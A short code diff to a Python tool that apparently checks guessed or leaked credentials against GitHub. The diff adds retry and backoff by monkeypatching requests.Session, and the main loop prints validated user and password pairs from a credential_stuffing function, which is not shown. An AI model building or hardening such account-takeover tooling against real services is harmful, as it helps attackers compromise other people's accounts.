@@ -9,7 +9,9 @@ import requests
 import string
 import sys
 import time
+from requests.adapters import HTTPAdapter
 from typing import Callable, Iterable, TextIO, Tuple
+from urllib3.util.retry import Retry
 
 API = 'https://api.github.com'
 ENV_VAR = 'GITHUB_TOKEN'
@@ -103,15 +105,24 @@ def check_password_strength(p: str, others: set) -> bool:
     )
 
 
+def set_retry_strategy(prefix='https://', *args, **kwargs):
+    'Enable a custom retry strategy.'
+    requests.Session.__enter__ = lambda self: self.mount(
+        prefix, HTTPAdapter(max_retries=Retry(*args, **kwargs))
+    ) or self
+
+
 def main(patterns: Iterable[Tuple], file: TextIO):
     'Print validated credentials.'
     if ENV_VAR not in os.environ:
         print('Please provide your %s as an environment variable.' % ENV_VAR)
         return
 
+    set_retry_strategy(backoff_factor=1)
     for pattern in patterns:
         for user, password in credential_stuffing(*pattern):
             print(user, password, file=file)
+        print(file=file)
 
 
 if __name__ == '__main__':
